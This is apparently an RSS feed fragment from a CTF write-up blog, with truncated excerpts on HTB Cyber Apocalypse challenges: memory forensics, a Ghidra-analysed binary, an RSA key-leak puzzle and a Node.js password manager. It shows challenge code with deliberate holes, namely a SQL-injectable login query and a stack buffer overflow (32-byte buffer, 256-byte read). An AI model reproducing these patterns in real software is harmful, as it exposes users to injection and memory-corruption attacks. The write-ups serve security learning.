&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">return&lt;/span>&lt;span class="mtk1"> (&lt;/span>&lt;span class="mtk1">rv&lt;/span>&lt;span class="mtk1">[&lt;/span>&lt;span class="mtk6">0&lt;/span>&lt;span class="mtk1">] &lt;/span>&lt;span class="mtk5">if&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">rv&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">else&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">None&lt;/span>&lt;span class="mtk1">) &lt;/span>&lt;span class="mtk5">if&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">one&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">else&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">rv&lt;/span>


&lt;span class="mtk7 mtki">def&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">login&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">username&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">password&lt;/span>&lt;span class="mtk1">):&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk3"># I don't think it's not possible to bypass login &lt;/span>&lt;span class="mtk3">because I'm verifying the password later.&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">user&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">query&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk7 mtki">f&lt;/span>&lt;span class="mtk4">'SELECT username, password FROM users WHERE userna&lt;/span>&lt;span class="mtk4">me = "&lt;/span>&lt;span class="mtk6">{&lt;/span>&lt;span class="mtk9 mtki">username&lt;/span>&lt;span class="mtk6">}&lt;/span>&lt;span class="mtk4">"'&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">one&lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk6">True&lt;/span>&lt;span class="mtk1">)&lt;/span> 

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">if&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">user&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">passwordCheck&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">passwordVerify&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">user&lt;/span>&lt;span class="mtk1">[&lt;/span>&lt;span class="mtk4">'password'&lt;/span>&lt;span class="mtk1">], &lt;/span>&lt;span class="mtk9 mtki">password&lt;/span>&lt;span class="mtk1">)&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">if&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">passwordCheck&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">token&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">createJWT&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">user&lt;/span>&lt;span class="mtk1">[&lt;/span>&lt;span class="mtk4">'username'&lt;/span>&lt;span class="mtk1">])&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">return&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">token&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">else&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">return&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">False&lt;/span>

&lt;span class="mtk7 mtki">def&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">getCommunication&lt;/span>&lt;span class="mtk1">():&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">return&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">query&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'SELECT * from communication'&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>

&lt;p>Moreover, the password is verified against a MD5 hash:&lt;/p></description></item><item><title>Pandora's Bane</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/pandoras-bane/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/pandoras-bane/</guid><description>&lt;p>We are given a large memory dump called &lt;code>mem.raw&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2">&lt;code class="no-highlight">&lt;span class="code-cyan">$&lt;/span> &lt;span class="code-dark-green">du&lt;/span> -h &lt;span class="mtku">mem.raw&lt;/span> 
2,1G	mem.raw

&lt;span class="code-cyan">$&lt;/span> &lt;span class="code-dark-green">file&lt;/span> &lt;span class="mtku">mem.raw&lt;/span>
mem.raw: data
&lt;/code>&lt;/pre>&lt;/div>

&lt;h2 id="memory-dump-analysis">Memory dump analysis&lt;/h2>
&lt;p>Let&amp;rsquo;s use &lt;a target="_blank" href="https://github.com/volatilityfoundation/volatility">&lt;code>volatility&lt;/code>&lt;/a> to analyze it (I will use a &lt;a target="_blank" href="https://hub.docker.com/r/sk4la/volatility3">Docker image&lt;/a> for that):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2">&lt;code class="no-highlight">&lt;span class="code-cyan">$&lt;/span> &lt;span class="code-dark-green">docker&lt;/span> run --rm -v &lt;span class="code-dark-yellow">"&lt;span class="code-dark-cyan">${PWD}&lt;/span>"&lt;/span>:/project --entrypoint /bin/sh --platform linux/amd64 -it sk4la/volatility3
/usr/local $ cd /project
/project $ vol -f mem.raw windows.info.Info | tee info.txt
Volatility 3 Framework 2.0.1
Progress: 100.00		PDB scanning finished
Variable	Value

Kernel Base	0xf80445604000
DTB	0x1ad000
Symbols	file:///usr/local/lib/volatility3/volatility3/symbols/windows/ntkrnlmp.pdb/CA8E2F01B822EDE6357898BFBF862997-1.json.xz 
Is64Bit	True
IsPAE	False
layer_name	0 WindowsIntel32e
memory_layer	1 FileLayer
KdVersionBlock	0xf80446213368
Major/Minor	15.19041
MachineType	34404
KeNumberProcessors	5
SystemTime	2023-03-15 19:49:46
NtSystemRoot	C:\Windows
NtProductType	NtProductWinNt
NtMajorVersion	10
NtMinorVersion	0
PE MajorOperatingSystemVersion	10
PE MinorOperatingSystemVersion	0
PE Machine	34404
PE TimeDateStamp	Wed Jan 4 04:27:11 1995
&lt;/code>&lt;/pre>&lt;/div>

&lt;p>Now we can list all processes with &lt;code>windows.pstree.PsTree&lt;/code>:&lt;/p></description></item><item><title>Pandora's Box</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/pandoras-box/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/pandoras-box/</guid><description>&lt;p>We are given a 64-bit binary called &lt;code>pb&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2">&lt;code class="no-highlight">Arch: amd64-64-little
RELRO: &lt;span class="code-dark-green">Full RELRO&lt;/span>
Stack: &lt;span class="code-dark-red">No canary found&lt;/span>
NX: &lt;span class="code-dark-green">NX enabled&lt;/span>
PIE: &lt;span class="code-dark-red">No PIE (0x400000)&lt;/span> 
RUNPATH: &lt;span class="code-dark-red">b'./glibc/'&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>

&lt;h2 id="reverse-engineering">Reverse engineering&lt;/h2>
&lt;p>We can use Ghidra to analyze the binary and look at the decompiled source code in C:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2">&lt;code class="no-highlight">&lt;span class="mtk7 mtki">int&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">main&lt;/span>&lt;span class="mtk1">() {&lt;/span> 
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">setup&lt;/span>&lt;span class="mtk1">();&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">cls&lt;/span>&lt;span class="mtk1">();&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">banner&lt;/span>&lt;span class="mtk1">();&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">box&lt;/span>&lt;span class="mtk1">();&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">return&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">0&lt;/span>&lt;span class="mtk1">;&lt;/span>
&lt;span class="mtk1">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>

&lt;p>Among others, this function calls &lt;code>box&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2">&lt;code class="no-highlight">&lt;span class="mtk7 mtki">void&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">box&lt;/span>&lt;span class="mtk1">() {&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">long&lt;/span>&lt;span class="mtk1"> num;&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">char&lt;/span>&lt;span class="mtk1"> data [&lt;/span>&lt;span class="mtk6">32&lt;/span>&lt;span class="mtk1">];&lt;/span>

&lt;span class="mtk1"> data._0_8_ &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">0&lt;/span>&lt;span class="mtk1">;&lt;/span>
&lt;span class="mtk1"> data._8_8_ &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">0&lt;/span>&lt;span class="mtk1">;&lt;/span>
&lt;span class="mtk1"> data._16_8_ &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">0&lt;/span>&lt;span class="mtk1">;&lt;/span>
&lt;span class="mtk1"> data._24_8_ &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">0&lt;/span>&lt;span class="mtk1">;&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">fwrite&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">"This is one of Pandora&lt;/span>&lt;span class="mtk6">\'&lt;/span>&lt;span class="mtk4">s mythical boxes!&lt;/span>&lt;span class="mtk6">\n\n&lt;/span>&lt;span class="mtk4">Will you open it or Return it to the Library for &lt;/span>&lt;span class="mtk4">analysis?&lt;/span>&lt;span class="mtk6">\n\n&lt;/span>&lt;span class="mtk4">1. Open.&lt;/span>&lt;span class="mtk6">\n&lt;/span>&lt;span class="mtk4">2. Return.&lt;/span>&lt;span class="mtk6">\n\n&lt;/span>&lt;span class="mtk4">&amp;gt;&amp;gt; "&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk6">1&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk5">0x&lt;/span>&lt;span class="mtk6">7e&lt;/span>&lt;span class="mtk1">, stdout);&lt;/span> 
&lt;span class="mtk1"> num &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">read_num&lt;/span>&lt;span class="mtk1">();&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">if&lt;/span>&lt;span class="mtk1"> (num &lt;/span>&lt;span class="mtk5">!=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">2&lt;/span>&lt;span class="mtk1">) {&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">fprintf&lt;/span>&lt;span class="mtk1">(stdout,&lt;/span>&lt;span class="mtk4">"&lt;/span>&lt;span class="mtk6">%s\n&lt;/span>&lt;span class="mtk4">WHAT HAVE YOU DONE?! WE ARE DOOMED!&lt;/span>&lt;span class="mtk6">\n\n&lt;/span>&lt;span class="mtk4">"&lt;/span>&lt;span class="mtk1">,&lt;/span>&lt;span class="mtk5">&amp;amp;&lt;/span>&lt;span class="mtk1">DAT_004021c7);&lt;/span>
&lt;span class="mtk3"> /* WARNING: Subroutine does no&lt;/span>&lt;span class="mtk3">t return */&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">exit&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk5">0x&lt;/span>&lt;span class="mtk6">520&lt;/span>&lt;span class="mtk1">);&lt;/span>
&lt;span class="mtk1"> }&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">fwrite&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">"&lt;/span>&lt;span class="mtk6">\n&lt;/span>&lt;span class="mtk4">Insert location of the library: "&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk6">1&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk5">0x&lt;/span>&lt;span class="mtk6">21&lt;/span>&lt;span class="mtk1">, stdout);&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">fgets&lt;/span>&lt;span class="mtk1">(data, &lt;/span>&lt;span class="mtk6">256&lt;/span>&lt;span class="mtk1">, stdin);&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">fwrite&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">"&lt;/span>&lt;span class="mtk6">\n&lt;/span>&lt;span class="mtk4">We will deliver the mythical box to the Library fo&lt;/span>&lt;span class="mtk4">r analysis, thank you!&lt;/span>&lt;span class="mtk6">\n\n&lt;/span>&lt;span class="mtk4">"&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk6">1&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk5">0x&lt;/span>&lt;span class="mtk6">4b&lt;/span>&lt;span class="mtk1">, stdout);&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">return&lt;/span>&lt;span class="mtk1">;&lt;/span>
&lt;span class="mtk1">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>

&lt;h3 id="buffer-overflow-vulnerability">Buffer Overflow vulnerability&lt;/h3>
&lt;p>The binary is vulnerable to Buffer Overflow since there is a variable called &lt;code>data&lt;/code> that has 32 bytes assigned as buffer, but the program is reading up to 256 bytes from &lt;code>stdin&lt;/code> and storing the data into &lt;code>data&lt;/code>, overflowing the reserved buffer if the size of the input data is greater than 32 bytes.&lt;/p></description></item><item><title>Partial Tenacity</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/partial-tenacity/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/partial-tenacity/</guid><description>&lt;p>We are given the Python source code that encrypts the flag:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2">&lt;code class="no-highlight">&lt;span class="mtk5">from&lt;/span>&lt;span class="mtk1"> secret &lt;/span>&lt;span class="mtk5">import&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">FLAG&lt;/span>
&lt;span class="mtk5">from&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">Crypto&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8 mtku">PublicKey&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">import&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">RSA&lt;/span>
&lt;span class="mtk5">from&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">Crypto&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8 mtku">Cipher&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">import&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">PKCS1_OAEP&lt;/span>

&lt;span class="mtk7 mtki">class&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">RSACipher&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">def&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7">__init__&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">bits&lt;/span>&lt;span class="mtk1">):&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">key&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">RSA&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">generate&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">bits&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">cipher&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">PKCS1_OAEP&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">new&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">key&lt;/span>&lt;span class="mtk1">)&lt;/span> 
&lt;span class="mtk1"> &lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">def&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">encrypt&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">m&lt;/span>&lt;span class="mtk1">):&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">return&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">cipher&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">encrypt&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">m&lt;/span>&lt;span class="mtk1">)&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">def&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">decrypt&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">c&lt;/span>&lt;span class="mtk1">):&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">return&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">cipher&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">decrypt&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">c&lt;/span>&lt;span class="mtk1">)&lt;/span>

&lt;span class="mtk1">cipher&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">RSACipher&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk6">1024&lt;/span>&lt;span class="mtk1">)&lt;/span>

&lt;span class="mtk1">enc_flag&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">cipher&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">encrypt&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk6">FLAG&lt;/span>&lt;span class="mtk1">)&lt;/span>

&lt;span class="mtk5">with&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">open&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'output.txt'&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk4">'w'&lt;/span>&lt;span class="mtk1">) &lt;/span>&lt;span class="mtk5">as&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">f&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">f&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">write&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk7 mtki">f&lt;/span>&lt;span class="mtk4">'n = &lt;/span>&lt;span class="mtk6">{&lt;/span>&lt;span class="mtk1">cipher&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">key&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">n&lt;/span>&lt;span class="mtk6">}\n&lt;/span>&lt;span class="mtk4">'&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">f&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">write&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk7 mtki">f&lt;/span>&lt;span class="mtk4">'ct = &lt;/span>&lt;span class="mtk6">{&lt;/span>&lt;span class="mtk1">enc_flag&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">hex&lt;/span>&lt;span class="mtk1">()&lt;/span>&lt;span class="mtk6">}\n&lt;/span>&lt;span class="mtk4">'&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">f&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">write&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk7 mtki">f&lt;/span>&lt;span class="mtk4">'p = &lt;/span>&lt;span class="mtk6">{&lt;/span>&lt;span class="mtk8 mtku">str&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">cipher&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">key&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">p&lt;/span>&lt;span class="mtk1">)[::&lt;/span>&lt;span class="mtk6">2&lt;/span>&lt;span class="mtk1">]&lt;/span>&lt;span class="mtk6">}\n&lt;/span>&lt;span class="mtk4">'&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">f&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">write&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk7 mtki">f&lt;/span>&lt;span class="mtk4">'q = &lt;/span>&lt;span class="mtk6">{&lt;/span>&lt;span class="mtk8 mtku">str&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">cipher&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">key&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">q&lt;/span>&lt;span class="mtk1">)[&lt;/span>&lt;span class="mtk6">1&lt;/span>&lt;span class="mtk1">::&lt;/span>&lt;span class="mtk6">2&lt;/span>&lt;span class="mtk1">]&lt;/span>&lt;span class="mtk6">}&lt;/span>&lt;span class="mtk4">'&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>

&lt;p>We also have the output of the script:&lt;/p></description></item><item><title>Passman</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/passman/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/passman/</guid><description>&lt;p>We are given a website like this:&lt;/p>
&lt;p>&lt;img alt="Passman 1" src="https://7rocky.github.io/images/other/HTB%20Cyber%20Apocalypse%202023/Passman-1.webp">&lt;/p>
&lt;p>We also have the source code in Node.js.&lt;/p>
&lt;h2 id="source-code-analysis">Source code analysis&lt;/h2>
&lt;p>The web application is built with Express JS. A relevant file is &lt;code>routes/index.js&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2">&lt;code class="no-highlight">&lt;span class="mtk7 mtki">const&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">express&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">require&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'express'&lt;/span>&lt;span class="mtk1">);&lt;/span>
&lt;span class="mtk7 mtki">const&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">router&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">express&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">Router&lt;/span>&lt;span class="mtk1">();&lt;/span>
&lt;span class="mtk7 mtki">const&lt;/span>&lt;span class="mtk1"> { graphqlHTTP } &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">require&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'express-graphql'&lt;/span>&lt;span class="mtk1">);&lt;/span>
&lt;span class="mtk7 mtki">const&lt;/span>&lt;span class="mtk1"> AuthMiddleware &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">require&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'../middleware/AuthMiddleware'&lt;/span>&lt;span class="mtk1">);&lt;/span>
&lt;span class="mtk7 mtki">const&lt;/span>&lt;span class="mtk1"> GraphqlSchema &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">require&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'../helpers/GraphqlHelper'&lt;/span>&lt;span class="mtk1">);&lt;/span>

&lt;span class="mtk1">router&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">get&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'/'&lt;/span>&lt;span class="mtk1">, (&lt;/span>&lt;span class="mtk9 mtki">req&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">res&lt;/span>&lt;span class="mtk1">) &lt;/span>&lt;span class="mtk7 mtki">=&amp;gt;&lt;/span>&lt;span class="mtk1"> {&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">return&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">res&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">render&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'login.html'&lt;/span>&lt;span class="mtk1">);&lt;/span>
&lt;span class="mtk1">});&lt;/span>

&lt;span class="mtk1">router&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">get&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'/register'&lt;/span>&lt;span class="mtk1">, (&lt;/span>&lt;span class="mtk9 mtki">req&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">res&lt;/span>&lt;span class="mtk1">) &lt;/span>&lt;span class="mtk7 mtki">=&amp;gt;&lt;/span>&lt;span class="mtk1"> {&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">return&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">res&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">render&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'register.html'&lt;/span>&lt;span class="mtk1">);&lt;/span>
&lt;span class="mtk1">});&lt;/span>

